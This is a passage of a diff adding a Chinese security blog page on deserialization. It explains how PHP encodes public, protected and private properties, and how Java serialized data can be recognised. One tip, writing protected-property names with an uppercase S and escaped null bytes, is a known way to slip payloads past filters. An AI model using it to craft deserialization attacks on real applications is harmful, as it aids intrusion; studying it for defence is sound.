+<td align="center">Object</td>
+<td align="center">O:strlen(object name):object name:object size:</td>
+</tr>
+</tbody></table>
+<h4 id="public、protected、private下序列化对象的区别"><a href="#public、protected、private下序列化对象的区别" class="headerlink" title="public、protected、private下序列化对象的区别"></a>public、protected、private下序列化对象的区别</h4><p>php v7.x反序列化的时候对访问类别不敏感</p>
+<ul>
+<li>public变量<br>直接变量名反序列化出来</li>
+<li>protected变量<br><code>\x00 + * + \x00 + 变量名</code><br>可以用<code>S:5:&quot;\00*\00op&quot;</code>来代替<code>s:5:&quot;?*?op&quot;</code></li>
+<li>private变量<br><code>\x00 + 类名 + \x00 + 变量名</code></li>
+</ul>
+<h2 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h2><p>下方的特征可以作为序列化的标志参考:</p>
+<ul>
+<li><p>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p>
+</li>
+<li><p>或者如果以<code>aced</code>开头，那么他就是这一段java序列化的16进制</p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">PHP 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize"><span class="toc-number">1.1.1.</span> <span class="toc-text">serialize()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize"><span class="toc-number">1.1.2.</span> <span class="toc-text">unserialize()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">常用魔法函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%BA%8F%E5%88%97%E5%8C%96%E8%A1%A5%E5%85%85"><span class="toc-number">1.1.4.</span> <span class="toc-text">php序列化补充</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.</span> <span class="toc-text">构造函数与析构函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%86%E8%8A%82"><span class="toc-number">1.1.6.</span> <span class="toc-text">序列化细节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%AB%E4%B9%89"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">序列化含义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#public%E3%80%81protected%E3%80%81private%E4%B8%8B%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">public、protected、private下序列化对象的区别</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">JAVA反序列化</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=反序列化&body=Check out this article: https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    iahzl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/categories/">categories</a></li><!--
+    --><!--
+      --><li><a href="/tags/">tags</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?10298bb37106529e820abfbd855cea34";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
